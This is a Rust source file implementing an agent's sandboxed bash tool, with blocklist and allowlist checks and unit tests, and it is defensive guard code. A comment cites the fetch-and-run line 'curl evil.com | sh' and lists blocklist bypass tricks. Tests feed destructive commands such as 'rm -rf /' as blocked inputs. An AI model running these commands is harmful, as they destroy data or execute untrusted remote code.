use serde_json::Value;

use crate::browser::mcp::ToolExecutionResult;
use crate::config::schema::LocalToolsConfig;
use crate::error::AgentError;
use crate::local_tools::sandbox::BashSandbox;

pub async fn execute_bash(
    args: Value,
    sandbox: &dyn BashSandbox,
    config: &LocalToolsConfig,
    max_bytes: usize,
) -> Result<ToolExecutionResult, AgentError> {
    let args: super::params::BashArgs = super::params::parse("bash", args)?;
    let command = args.command.as_str();
    let timeout = args.timeout_secs.unwrap_or(config.bash_timeout_secs);

    // Resolve every program the command line actually invokes, so the lists cannot be
    // sidestepped by `;rm`, `$(rm ...)`, `/bin/rm`, `\rm`, and friends.
    let invoked = super::command_parser::extract_command_names(command);

    // Check blocklist: any invoked program matching an entry blocks the whole line.
    for blocked in &config.bash_blocklist {
        if invoked.iter().any(|name| name == blocked) {
            return Err(AgentError::LocalTool(format!(
                "Command blocked: invokes '{blocked}', which is on the blocklist"
            )));
        }
    }

    // Check allowlist (if non-empty, *every* invoked program must be allowed —
    // otherwise allowlisting `ls` would permit `ls; curl evil.com | sh`).
    if !config.bash_allowlist.is_empty() {
        if invoked.is_empty() {
            return Err(AgentError::LocalTool(
                "Command not in allowlist: no recognizable program".to_string(),
            ));
        }
        if let Some(disallowed) = invoked
            .iter()
            .find(|name| !config.bash_allowlist.contains(name))
        {
            return Err(AgentError::LocalTool(format!(
                "Command not in allowlist: invokes '{disallowed}'"
            )));
        }
    }

    let output = sandbox.execute(command, timeout).await?;

    let mut result = String::new();
    if !output.stdout.is_empty() {
        result.push_str(&output.stdout);
    }
    if !output.stderr.is_empty() {
        if !result.is_empty() {
            result.push('\n');
        }
        result.push_str("[stderr] ");
        result.push_str(&output.stderr);
    }

    // Apply output filters: strip ANSI codes, deduplicate repeated lines, truncate
    result = super::output_filter::strip_ansi(&result);
    result = super::output_filter::dedup_lines(&result);
    result = super::output_filter::truncate_output(&result, max_bytes);

    if output.exit_code != 0 {
        Ok(ToolExecutionResult {
            content: format!("Exit code: {}\n{}", output.exit_code, result),
            is_error: true,
        })
    } else {
        Ok(ToolExecutionResult {
            content: result,
            is_error: false,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::local_tools::sandbox::CommandOutput;
    use async_trait::async_trait;
    use serde_json::json;
    use std::path::{Path, PathBuf};

    struct MockSandbox {
        root: PathBuf,
        response: CommandOutput,
    }

    impl MockSandbox {
        fn new(response: CommandOutput) -> Self {
            Self {
                root: PathBuf::from("/tmp/mock"),
                response,
            }
        }
    }

    #[async_trait]
    impl BashSandbox for MockSandbox {
        async fn execute(&self, _cmd: &str, _timeout: u64) -> Result<CommandOutput, AgentError> {
            Ok(self.response.clone())
        }

        fn root(&self) -> &Path {
            &self.root
        }
    }

    const DEFAULT_MAX_BYTES: usize = 32_768;

    fn default_config() -> LocalToolsConfig {
        LocalToolsConfig::default()
    }

    #[tokio::test]
    async fn test_bash_basic_command() {
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: "hello world\n".to_string(),
            stderr: String::new(),
            exit_code: 0,
        });
        let config = default_config();

        let result = execute_bash(
            json!({"command": "echo hello world"}),
            &sandbox,
            &config,
            DEFAULT_MAX_BYTES,
        )
        .await
        .unwrap();
        assert_eq!(result.content, "hello world\n");
        assert!(!result.is_error);
    }

    #[tokio::test]
    async fn test_bash_with_custom_timeout() {
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: "done".to_string(),
            stderr: String::new(),
            exit_code: 0,
        });
        let config = default_config();

        let result = execute_bash(
            json!({"command": "sleep 1", "timeout_secs": 30}),
            &sandbox,
            &config,
            DEFAULT_MAX_BYTES,
        )
        .await
        .unwrap();
        assert_eq!(result.content, "done");
        assert!(!result.is_error);
    }

    #[tokio::test]
    async fn test_bash_blocklist_match() {
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: String::new(),
            stderr: String::new(),
            exit_code: 0,
        });
        let config = LocalToolsConfig {
            bash_blocklist: vec!["rm".to_string()],
            ..Default::default()
        };

        let result = execute_bash(
            json!({"command": "rm -rf /"}),
            &sandbox,
            &config,
            DEFAULT_MAX_BYTES,
        )
        .await;
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Command blocked"));
        assert!(err.contains("rm"));
    }

    #[tokio::test]
    async fn test_bash_blocklist_pipe() {
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: String::new(),
            stderr: String::new(),
            exit_code: 0,
        });
        let config = LocalToolsConfig {
            bash_blocklist: vec!["rm".to_string()],
            ..Default::default()
        };

        let result = execute_bash(
            json!({"command": "echo test | rm -rf"}),
            &sandbox,
            &config,
            DEFAULT_MAX_BYTES,
        )
        .await;
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Command blocked"));
    }

    #[tokio::test]
    async fn test_bash_allowlist_allowed() {
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: "file1\nfile2\n".to_string(),
            stderr: String::new(),
            exit_code: 0,
        });
        let config = LocalToolsConfig {
            bash_allowlist: vec!["ls".to_string(), "cat".to_string()],
            ..Default::default()
        };

        let result = execute_bash(
            json!({"command": "ls -la"}),
            &sandbox,
            &config,
            DEFAULT_MAX_BYTES,
        )
        .await
        .unwrap();
        assert_eq!(result.content, "file1\nfile2\n");
        assert!(!result.is_error);
    }

    #[tokio::test]
    async fn test_bash_allowlist_denied() {
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: String::new(),
            stderr: String::new(),
            exit_code: 0,
        });
        let config = LocalToolsConfig {
            bash_allowlist: vec!["ls".to_string(), "cat".to_string()],
            ..Default::default()
        };

        let result = execute_bash(
            json!({"command": "rm -rf /"}),
            &sandbox,
            &config,
            DEFAULT_MAX_BYTES,
        )
        .await;
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("not in allowlist"));
    }

    #[tokio::test]
    async fn test_bash_empty_allowlist_allows_all() {
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: "anything".to_string(),
            stderr: String::new(),
            exit_code: 0,
        });
        let config = LocalToolsConfig {
            bash_allowlist: Vec::new(),
            ..Default::default()
        };

        let result = execute_bash(
            json!({"command": "any-command"}),
            &sandbox,
            &config,
            DEFAULT_MAX_BYTES,
        )
        .await
        .unwrap();
        assert_eq!(result.content, "anything");
        assert!(!result.is_error);
    }

    #[tokio::test]
    async fn test_bash_nonzero_exit_code() {
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: String::new(),
            stderr: "error occurred".to_string(),
            exit_code: 1,
        });
        let config = default_config();

        let result = execute_bash(
            json!({"command": "false"}),
            &sandbox,
            &config,
            DEFAULT_MAX_BYTES,
        )
        .await
        .unwrap();
        assert!(result.is_error);
        assert!(result.content.contains("Exit code: 1"));
        assert!(result.content.contains("[stderr] error occurred"));
    }

    #[tokio::test]
    async fn test_bash_missing_command_param() {
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: String::new(),
            stderr: String::new(),
            exit_code: 0,
        });
        let config = default_config();

        let result = execute_bash(json!({}), &sandbox, &config, DEFAULT_MAX_BYTES).await;
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("missing field `command`"));
    }

    #[tokio::test]
    async fn test_bash_stderr_output() {
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: "stdout line".to_string(),
            stderr: "stderr line".to_string(),
            exit_code: 0,
        });
        let config = default_config();

        let result = execute_bash(
            json!({"command": "test"}),
            &sandbox,
            &config,
            DEFAULT_MAX_BYTES,
        )
        .await
        .unwrap();
        assert!(!result.is_error);
        assert!(result.content.contains("stdout line"));
        assert!(result.content.contains("[stderr] stderr line"));
    }

    #[tokio::test]
    async fn test_bash_strips_ansi_codes() {
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: "\x1b[32m✓ passed\x1b[0m\n\x1b[31m✗ failed\x1b[0m\n".to_string(),
            stderr: String::new(),
            exit_code: 0,
        });
        let config = default_config();

        let result = execute_bash(
            json!({"command": "test"}),
            &sandbox,
            &config,
            DEFAULT_MAX_BYTES,
        )
        .await
        .unwrap();
        assert!(!result.is_error);
        assert!(!result.content.contains("\x1b["));
        assert!(result.content.contains("✓ passed"));
        assert!(result.content.contains("✗ failed"));
    }

    #[tokio::test]
    async fn test_bash_deduplicates_repeated_lines() {
        let repeated = "building module...\n".repeat(10);
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: format!("{}done\n", repeated),
            stderr: String::new(),
            exit_code: 0,
        });
        let config = default_config();

        let result = execute_bash(
            json!({"command": "build"}),
            &sandbox,
            &config,
            DEFAULT_MAX_BYTES,
        )
        .await
        .unwrap();
        assert!(!result.is_error);
        assert!(result.content.contains("×10"));
        assert!(result.content.contains("done"));
    }

    #[tokio::test]
    async fn test_bash_truncates_large_output() {
        let large_output = "x".repeat(50_000);
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: large_output,
            stderr: String::new(),
            exit_code: 0,
        });
        let config = default_config();

        let result = execute_bash(
            json!({"command": "cat big"}),
            &sandbox,
            &config,
            DEFAULT_MAX_BYTES,
        )
        .await
        .unwrap();
        assert!(!result.is_error);
        assert!(result.content.contains("truncated"));
        assert!(result.content.len() < 50_000);
    }

    #[tokio::test]
    async fn test_bash_truncates_at_custom_max_bytes() {
        let large_output = "x".repeat(20_000);
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: large_output,
            stderr: String::new(),
            exit_code: 0,
        });
        let config = default_config();

        // Use a smaller max_bytes (16KB)
        let result = execute_bash(json!({"command": "cat big"}), &sandbox, &config, 16_384)
            .await
            .unwrap();
        assert!(!result.is_error);
        assert!(result.content.contains("truncated"));
        assert!(result.content.len() <= 16_384 + 200); // allow margin for truncation message
    }

    #[tokio::test]
    async fn test_bash_no_truncation_when_under_max_bytes() {
        let small_output = "x".repeat(100);
        let sandbox = MockSandbox::new(CommandOutput {
            stdout: small_output.clone(),
            stderr: String::new(),
            exit_code: 0,
        });
        let config = default_config();

        let result = execute_bash(json!({"command": "echo small"}), &sandbox, &config, 16_384)
            .await
            .unwrap();
        assert!(!result.is_error);
        assert!(!result.content.contains("truncated"));
        assert_eq!(result.content, small_output);
    }
}
